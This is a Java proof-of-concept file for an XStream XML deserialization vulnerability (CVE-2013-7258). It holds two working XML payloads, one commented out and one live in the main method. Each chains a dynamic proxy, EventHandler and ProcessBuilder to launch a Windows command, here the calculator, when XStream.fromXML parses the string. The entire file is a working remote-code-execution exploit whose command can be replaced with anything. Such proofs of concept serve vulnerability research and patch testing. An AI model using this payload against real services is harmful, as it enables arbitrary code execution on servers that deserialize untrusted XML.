package org.dili.xstream;

import com.thoughtworks.xstream.XStream;

public class CVE20137258 {
    public static void main(String[] args) {
        XStream xStream = new XStream();
        // POC1
        // String xml = "<sorted-set>\n" +
        //         "    <string>foo</string>\n" +
        //         "    <dynamic-proxy>\n" +
        //         "        <interface>java.lang.Comparable</interface>\n" +
        //         "        <handler class=\"java.beans.EventHandler\">\n" +
        //         "            <target class=\"java.lang.ProcessBuilder\">\n" +
        //         "                <command>\n" +
        //         "                    <string>cmd</string>\n" +
        //         "                   <string>/C</string>\n" +
        //         "                    <string>calc.exe</string>\n" +
        //         "                </command>\n" +
        //         "            </target>\n" +
        //         "            <action>start</action>\n" +
        //         "        </handler>\n" +
        //         "    </dynamic-proxy>\n" +
        //         "</sorted-set>";

        // POC2
        String xml = "<tree-map>\n" +
                "    <entry>\n" +
                "        <dynamic-proxy>\n" +
                "            <interface>java.lang.Comparable</interface>\n" +
                "            <handler class=\"java.beans.EventHandler\">\n" +
                "                <target class=\"java.lang.ProcessBuilder\">\n" +
                "                    <command>\n" +
                "                        <string>cmd</string>\n" +
                "                        <string>/C</string>\n" +
                "                        <string>calc</string>\n" +
                "                    </command>\n" +
                "                </target>\n" +
                "                <action>start</action>\n" +
                "            </handler>\n" +
                "        </dynamic-proxy>\n" +
                "        <string>good</string>\n" +
                "    </entry>\n" +
                "</tree-map>";
        xStream.fromXML(xml);
    }
}
